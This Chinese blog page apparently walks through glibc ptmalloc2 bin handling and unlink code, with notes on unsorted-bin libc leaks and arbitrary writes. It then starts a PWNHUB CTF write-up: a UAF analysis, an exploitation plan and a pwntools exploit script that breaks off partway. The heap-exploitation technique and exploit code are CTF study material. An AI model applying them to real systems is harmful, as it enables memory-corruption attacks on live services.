<code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>unsorted bin</code>的第一个<code>chunk</code>与所申请<code>chunk</code>精确匹配则直接返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take now instead of binning if exact fit *&#x2F;          if (size &#x3D;&#x3D; nb)            &#123;              set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;将匹配的的chunk设置为inuse              if (av !&#x3D; &amp;main_arena)                victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;若分配区非main_arena则设置为NON_MAIN_ARENA              check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);&#x2F;&#x2F;返回堆的user data地址              alloc_perturb (p, bytes);              return p;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="unsorted-bin相关漏洞和绕过利用原理"><a href="#unsorted-bin相关漏洞和绕过利用原理" class="headerlink" title="unsorted bin相关漏洞和绕过利用原理"></a>unsorted bin相关漏洞和绕过利用原理</h2><h3 id="利用unsorted-bin泄露libc地址"><a href="#利用unsorted-bin泄露libc地址" class="headerlink" title="利用unsorted bin泄露libc地址"></a>利用unsorted bin泄露libc地址</h3><ul><li><p>释放一个堆到<code>unsorted bin</code>之后输出这个堆的<code>fd</code></p><ul><li>原理：将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为倒数第二个堆的过程中时<code>fwd = bck = main_arena  </code> ，连接之后被释放的堆的<code>fd</code>和<code>bk</code>均指向<code>main_arena</code></li></ul></li><li><p>两个相同大小的unsorted bin合并，申请一个相同大小的堆块，此时残留fd，可以泄露libc</p><ul><li><p>原理： 判断下一个堆已经被释放合并到当前要释放的堆并通过<code>unlink</code>将该chunk从空闲链表中脱离的时候不会清空堆里的内容，所以两个堆合并的时候保留了<code>fd</code>和<code>bk</code>，在申请的时候只要不覆盖掉堆里的内容就能够把<code>main_arena</code>地址申请出来，两个堆必须地址连续</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="任意地址写为一个很大的数值"><a href="#任意地址写为一个很大的数值" class="headerlink" title="任意地址写为一个很大的数值"></a>任意地址写为一个很大的数值</h3><p>原理：将 <code>bck-&gt;fd</code> 的位置写入本 <code>unsorted Bin</code> 的位置，控制了<code>bk</code>即可将<code>unsorted_chunks (av)</code>写到任意地址（写入的地址要减两倍机器字长），将该堆申请出来就可以实现任意地址改为一个不可控的很大的数值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h2 id="free到small-bin"><a href="#free到small-bin" class="headerlink" title="free到small bin"></a>free到small bin</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-5"><a href="#运行过程-5" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断<code>unsorted bin</code>中循环到的堆是否和申请的堆大小精确匹配，不匹配则跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (size &#x3D;&#x3D; nb)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否属于<code>small bin</code>，属于则获取所在的<code>small bin</code>链下标和头结点和首结点，并且将循环到的堆连接到<code>small bin</code>的头部</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))            &#123;              victim_index &#x3D; smallbin_index (size);              bck &#x3D; bin_at (av, victim_index);              fwd &#x3D; bck-&gt;fd;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim-&gt;bk &#x3D; bck;         victim-&gt;fd &#x3D; fwd;         fwd-&gt;bk &#x3D; victim;         bck-&gt;fd &#x3D; victim;if (in_smallbin_range (size))           &#123;             victim_index &#x3D; smallbin_index (size);             bck &#x3D; bin_at (av, victim_index);             fwd &#x3D; bck-&gt;fd;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从small-bin取出chunk"><a href="#从small-bin取出chunk" class="headerlink" title="从small bin取出chunk"></a>从small bin取出chunk</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-6"><a href="#运行过程-6" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆的大小所在的下标和地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断所在的下标的链是否为空，为空则说明获取失败跳过该部分</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>不为空则判断获取到的链表尾部的堆是否为空，为空则说明<code>small bin</code>未初始化，调用<code>malloc_consolidate</code>进行初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空则先获取最后一个结点的下一个结点，判断下一个结点的<code>fd</code>是否为最后一个结点，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else           &#123;             bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))               &#123;                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过安全检查之后将最后一个结点设置<code>inuse</code>和<code>NON_MAIN_ARENA</code>位并且从链表中取出，返回该堆的地址指针</p></li></ul><pre class="line-numbers language-C" data-language="C"><code class="language-C">set_inuse_bit_at_offset (victim, nb);bin-&gt;bk &#x3D; bck;bck-&gt;fd &#x3D; bin;if (av !&#x3D; &amp;main_arena)  victim-&gt;size |&#x3D; NON_MAIN_ARENA;check_malloced_chunk (av, victim, nb);void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h2 id="free到large-bin"><a href="#free到large-bin" class="headerlink" title="free到large bin"></a>free到large bin</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-7"><a href="#运行过程-7" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断是否在<code>small bin</code> ，如果不在则在<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取循环到的堆在<code>large bin</code>中的下标并且取得该链表的首结点<code>bck</code>和头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim_index &#x3D; largebin_index (size);bck &#x3D; bin_at (av, victim_index);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断头结点和首结点是否相同，相同则说明该链表为空，直接跳过一些判断和连接，将该堆插入在<code>fd</code> <code>bk</code> 双向链表的头部，并且设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>都为其本身</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fwd !&#x3D; bck)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                victim-&gt;fd_nextsize &#x3D; victim-&gt;bk_nextsize &#x3D; victim;         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若不相同，即<code>if</code>成立则说明该链中还有其他堆，首先获取到循环到的堆的大小去掉<code>inuse</code>位之后的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Or with inuse bit to speed comparisons *&#x2F;                  size |&#x3D; PREV_INUSE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果最后一个堆在<code>main_arena</code>则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果循环到的堆的大小小于最小的堆那么插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中最小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      fwd &#x3D; bck;                      bck &#x3D; bck-&gt;bk;                      victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;                      victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是最小的堆那么遍历到第一个不小于该堆的<code>chunk</code>，遍历中判断每一个堆是否属于<code>main_arena</code>，属于则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                   &#123;                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                     while ((unsigned long) size &lt; fwd-&gt;size)                       &#123;                         fwd &#x3D; fwd-&gt;fd_nextsize;                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                       &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果遍历到的堆和循环中的堆的大小相同则在<code>fd</code> <code>bk</code>链表中插入到与其相同大小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) size &#x3D;&#x3D; (unsigned long) fwd-&gt;size)                       &#x2F;* Always insert in the second position.  *&#x2F;                       fwd &#x3D; fwd-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>否则就插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中遍历到的堆的后面</p><pre class="line-numbers language-none"><code class="language-none">else                        &#123;                          victim-&gt;fd_nextsize &#x3D; fwd;                          victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize &#x3D; victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>并且插入到<code>fd</code> <code>bk</code>链表中</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; fwd-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从large-bin取出chunk"><a href="#从large-bin取出chunk" class="headerlink" title="从large bin取出chunk"></a>从large bin取出chunk</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);    malloc(0x500);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-8"><a href="#运行过程-8" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[free到large bin](#free到large bin)结束</p></li><li><p>判断是否不属于<code>small bin</code>，即是否属于<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆所在的<code>large bin</code>链的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否该链为空或者最大的堆太小不能符合申请的堆的大小，若是则直接结束对<code>large bin</code>中申请堆的判断，若符合则获取了第一个堆到<code>victim</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; first (bin)) !&#x3D; bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;&#x3D; (unsigned long) (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>在<code>fd_nextsize</code> <code>bk_nextsize</code>链中循环遍历到第一个不小于申请的大小的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;bk_nextsize;              while (((unsigned long) (size &#x3D; chunksize (victim)) &lt;                      (unsigned long) (nb)))                victim &#x3D; victim-&gt;bk_nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断遍历到的堆不是尾结点并且它的大小等于它在<code>fd</code> <code>bk</code>链上的上一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (victim !&#x3D; last (bin) &amp;&amp; victim-&gt;size &#x3D;&#x3D; victim-&gt;fd-&gt;size)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小的堆在<code>fd</code> <code>bk</code>链上的第二个堆，因为第一个堆在<code>fd_nextsize</code> <code>bk_nextsize</code>链中，取出需要调整该链，但取出第二个堆就不需要调整链表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>保存该堆大小减去申请的大小的差值并且通过<a href="#unlink">unlink</a>操作从<code>large bin</code>链表中取出该堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder_size &#x3D; size - nb;unlink (av, victim, bck, fwd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果差值小于最小的堆的大小，则直接将该堆返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;设置inuse位                  if (av !&#x3D; &amp;main_arena)                    victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;设置NON_MAIN_ARENA位                &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);         alloc_perturb (p, bytes);         return p;&#x2F;&#x2F;获取并返回该堆的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>如果差值大于最小的堆的大小则切割<code>large bin</code>，获取上面取到的堆切割了申请的大小的堆之后剩余的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                &#123;                  remainder &#x3D; chunk_at_offset (victim, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的首结点和头结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks (av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查头结点的<code>bk</code>指向的堆是否是首结点，若不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#x2F;&#x2F;检查头结点后面一个结点是否是首结点                    &#123;                      errstr &#x3D; &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将剩余的堆插入<code>unsorted bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder-&gt;bk &#x3D; bck;            remainder-&gt;fd &#x3D; fwd;            bck-&gt;fd &#x3D; remainder;            fwd-&gt;bk &#x3D; remainder;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果剩余的堆不在<code>small bin</code> 的范围内则设置<code>fd_nextsize</code>和<code>bk_nextsize</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize &#x3D; NULL;                      remainder-&gt;bk_nextsize &#x3D; NULL;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>返回切割的符合大小要求的堆的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);&#x2F;&#x2F;返回切割出来的申请的大小的堆地址              return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;&#x2F;&#x2F; unlink p#define unlink(AV, P, BK, FD) &#123;                                                &#x2F;&#x2F; 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。    if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                   FD &#x3D; P-&gt;fd;                                                                          BK &#x3D; P-&gt;bk;                                                                          &#x2F;&#x2F; 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。    if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);      else &#123;                                                                              FD-&gt;bk &#x3D; BK;                                                                      BK-&gt;fd &#x3D; FD;                                                                      &#x2F;&#x2F; 下面主要考虑 P 对应的 nextsize 双向链表的修改        if (!in_smallbin_range (chunksize_nomask (P))                                          &#x2F;&#x2F; 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。            &#x2F;&#x2F; 那么其实也就没有必要对 nextsize 字段进行修改了。            &#x2F;&#x2F; 这里没有去判断 bk_nextsize 字段，可能会出问题。            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;                                  &#x2F;&#x2F; 类似于小的 chunk 的检查思路            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)                              || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))                  malloc_printerr (check_action,                                                                     &quot;corrupted double-linked list (not small)&quot;,                                   P, AV);                                                          &#x2F;&#x2F; 这里说明 P 已经在 nextsize 链表中了。            &#x2F;&#x2F; 如果 FD 没有在 nextsize 链表中            if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                                                      &#x2F;&#x2F; 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P                &#x2F;&#x2F; 令 FD 为 nextsize 串起来的                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                                                        FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;                                      else &#123;                                                                              &#x2F;&#x2F; 否则我们需要将 FD 插入到 nextsize 形成的双链表中                    FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                                  FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                                  P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;                                                  P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;                                                &#125;                                                                            &#125; else &#123;                                                                              &#x2F;&#x2F; 如果在的话，直接拿走即可                P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                      P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                    &#125;                                                                                &#125;                                                                            &#125;                                                                              &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ptmalloc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNHUB sh_v1_1</title>
      <link href="/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/"/>
      <url>/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>rm 释放堆之后未清零造成 UAF 漏洞</li><li>ln 执行时仅判断第一个文件是否存在而不会判断第二个文件是否存在，且连接成功后不存在的文件将被添加到文件列表</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>利用两个相同大小的unsorted bin合并，申请一个相同大小的堆块，堆快中残留的fd，可以泄露到 malloc_hook地址进而泄露libc基址</p></li><li><p>删除一个堆之后与另一个堆进行连接</p></li><li><p>再次删除这个堆，即间接的删除了与其进行连接的堆，而不会造成与其连接的堆从文件列表消失</p></li><li><p>再次连接后删除的文件又在文件列表中出现，此时两个文件即两个堆都已经被释放，且最开始被连接的堆的fd为其之后连接的堆</p></li><li><p>用gedit编辑最开始被释放的堆，即可修改其fd，再次申请就可以实现任意地址写</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./sh_v1.1'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.89.206'</span><span class="token punctuation">,</span><span class="token number">34883</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'touch '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'rm '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cp '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token 